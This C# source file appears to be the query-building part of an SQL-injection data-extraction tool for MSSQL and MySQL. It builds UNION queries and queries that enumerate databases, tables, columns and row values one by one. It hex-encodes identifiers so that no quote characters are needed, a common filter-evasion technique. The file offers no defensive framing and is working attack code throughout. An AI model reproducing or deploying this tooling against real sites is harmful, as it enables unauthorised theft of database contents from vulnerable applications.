using System;
using System.Collections.Generic;
using System.Text;
using ToolSet.DatabaseExtractorCode.DBExtractor;

namespace ToolSet.DatabaseExtractorCode.QueryConstructor
{
   internal class QueryConstructor
   {
      public List<string> GetUnionQueries(int minColumns, int maxColumns, DataBaseType databaseType)
      {
         var uqc = new UnionQueryConstructor();
         return uqc.CreateQueries(minColumns, maxColumns, databaseType);
      }

      public string DbGetVersion(DataBaseType dbType)
      {
         if (dbType == DataBaseType.Mssql)
            return "@@VERSION";

         return "VERSION()";
      }

      public string DbGetDatabase(DataBaseType dbType)
      {
         if (dbType == DataBaseType.Mssql)
            return "DB_NAME()";

         return "DATABASE()";
      }

      public string DbGetUser(DataBaseType dbType)
      {
         if (dbType == DataBaseType.Mssql)
            return "SYSTEM_USER";

         return "CURRENT_USER()";
      }

      public string GetDatarowValue(string databaseName, string tableName, string fieldName, int row,
                                    string orderByColumn, DataBaseType dbType)
      {
         if (dbType == DataBaseType.Mssql)
            return "SELECT TOP 1 CAST(" + fieldName + " as varchar) FROM (SELECT TOP " + Convert.ToString(1 + row) +
                   " * FROM " + databaseName + ".." + tableName + " ORDER BY " + orderByColumn +
                   ") AS newTable ORDER BY " + orderByColumn + " DESC";

         return "SELECT " + fieldName + " FROM " + databaseName + "." + tableName + " ORDER BY " + orderByColumn +
                " LIMIT " + row + ", 1";
      }

      public string GetDatarowsLength(string databaseName, string tableName, string fieldName, int row,
                                      DataBaseType dbType)
      {
         if (dbType == DataBaseType.Mssql)
            return "SELECT TOP 1 CAST(LEN(CAST(" + fieldName + " as varchar)) as varchar) FROM (SELECT TOP " +
                   Convert.ToString(1 + row) + " * FROM " + databaseName + ".." + tableName + " ORDER BY " + fieldName +
                   ") AS newTable ORDER BY " + fieldName + " DESC";

         return "SELECT LENGTH(" + fieldName + ") FROM " + databaseName + "." + tableName + " ORDER BY " +
                tableName + " LIMIT " + row + ", 1";
      }

      public string GetDatarowsCount(string databaseName, string tableName, DataBaseType dbType)
      {
         if (dbType == DataBaseType.Mssql)
            return "SELECT LTRIM(STR(COUNT(*))) FROM " + databaseName + ".." + tableName + "";

         return "SELECT COUNT(*) FROM " + databaseName + "." + tableName;
      }

      public string GetFeldTypQuery(string databaseName, string tableName, string fieldName, DataBaseType dbType)
      {
         if (dbType == DataBaseType.Mssql)
            return "SELECT data_type FROM " + databaseName + ".information_schema.columns WHERE " + databaseName +
                   ".information_schema.columns.column_name=CAST(0x" + StringToHex(fieldName) + " AS VARCHAR) AND " +
                   databaseName + ".information_schema.columns.table_name=CAST(0x" + StringToHex(tableName) +
                   " AS VARCHAR)";

         return "SELECT data_type FROM information_schema.COLUMNS WHERE table_name=CONCAT(0x" +
                StringToHex(tableName) + ") AND column_name=CONCAT(0x" + StringToHex(fieldName) +
                ") AND table_schema=CONCAT(0x" + StringToHex(databaseName) + ")";
      }

      public string GetFeldNamenQuery(string databaseName, string tableName, int fieldName, DataBaseType dbType)
      {
         if (dbType == DataBaseType.Mssql)
            return "SELECT TOP 1 column_name FROM " + databaseName + ".information_schema.columns, " + databaseName +
                   ".information_schema.tables WHERE " + databaseName + ".information_schema.columns.table_name=CAST(0x" +
                   StringToHex(tableName) + " AS VARCHAR) AND " + databaseName +
                   ".information_schema.columns.table_name=" + databaseName +
                   ".information_schema.tables.table_name AND " + databaseName +
                   ".information_schema.tables.table_type=CAST(0x42415345205441424c45 AS VARCHAR) AND column_name NOT IN (SELECT TOP " +
                   fieldName + " column_name FROM " + databaseName + ".information_schema.columns, " + databaseName +
                   ".information_schema.tables WHERE " + databaseName + ".information_schema.columns.table_name=CAST(0x" +
                   StringToHex(tableName) + " AS VARCHAR) AND " + databaseName +
                   ".information_schema.columns.table_name=" + databaseName +
                   ".information_schema.tables.table_name AND " + databaseName +
                   ".information_schema.tables.table_type=CAST(0x42415345205441424c45 AS VARCHAR) ORDER BY column_name) ORDER BY column_name";

         return "SELECT column_name FROM information_schema.COLUMNS WHERE table_name=CONCAT(0x" +
                StringToHex(tableName) + ") AND table_schema=CONCAT(0x" + StringToHex(databaseName) + ") LIMIT " +
                fieldName + ", 1";
      }

      public string GetFeldAnzahlQuery(string databaseName, string tableName, DataBaseType dbType)
      {
         if (dbType == DataBaseType.Mssql)
            return "SELECT LTRIM(STR(COUNT(column_name))) FROM " + databaseName + ".information_schema.columns, " +
                   databaseName + ".information_schema.tables WHERE " + databaseName +
                   ".information_schema.columns.table_name=Cast(0x" + StringToHex(tableName) + " as VARCHAR) AND " +
                   databaseName + ".information_schema.columns.table_name=" + databaseName +
                   ".information_schema.tables.table_name AND " + databaseName +
                   ".information_schema.tables.table_type=CAST(0x42415345205441424c45 AS VARCHAR)";

         return "SELECT COUNT(column_name) FROM information_schema.COLUMNS WHERE table_name=CONCAT(0x" +
                StringToHex(tableName) + ") AND table_schema=CONCAT(0x" + StringToHex(databaseName) + ")";
      }


      public string GetTabellenNamenQuery(string databaseName, int tableName, DataBaseType dbType)
      {
         if (dbType == DataBaseType.Mssql)
            return "SELECT TOP 1 table_name FROM " + databaseName +
                   ".information_schema.tables WHERE table_type=CAST(0x42415345205441424c45 AS VARCHAR) AND table_name NOT IN (SELECT TOP " +
                   tableName + " table_name FROM " + databaseName +
                   ".information_schema.tables WHERE table_type=CAST(0x42415345205441424c45 AS VARCHAR) ORDER BY table_name) ORDER BY table_name";

         return "SELECT table_name FROM information_schema.TABLES WHERE table_schema=CONCAT(0x" +
                StringToHex(databaseName) + ") LIMIT " + tableName + ", 1";
      }

      public string TabellenAnzahl(string databaseName, DataBaseType dbType)
      {
         if (dbType == DataBaseType.Mssql)
            return "SELECT LTRIM(STR(COUNT(table_name))) FROM " + databaseName +
                   ".information_schema.tables WHERE table_type=CAST(0x42415345205441424c45 AS VARCHAR)";

         return "SELECT COUNT(table_name) FROM information_schema.TABLES WHERE table_schema=CONCAT(0x" +
                StringToHex(databaseName) + ")";
      }

      public string GetDatabaseCountQuery(DataBaseType dbType)
      {
         if (dbType == DataBaseType.Mssql)
            return "SELECT LTRIM(STR(COUNT(name))) FROM master..sysdatabases";

         return "SELECT COUNT(schema_name) FROM information_schema.SCHEMATA";
      }

      public string GetDatabaseNameQuery(DataBaseType dbType, int dbIndex)
      {
         if (dbType == DataBaseType.Mssql)
            return "SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN (SELECT TOP " + dbIndex +
                   " name FROM master..sysdatabases ORDER BY name)";

         return "SELECT schema_name FROM information_schema.SCHEMATA LIMIT " + dbIndex + ", 1";
      }

      private static string StringToHex(string hexstring)
      {
         var sb = new StringBuilder();
         for (int i = 0; i < hexstring.Length; i++)
            sb.Append(Convert.ToInt32(hexstring[i]).ToString("x"));
         return sb.ToString();
      }
   }
}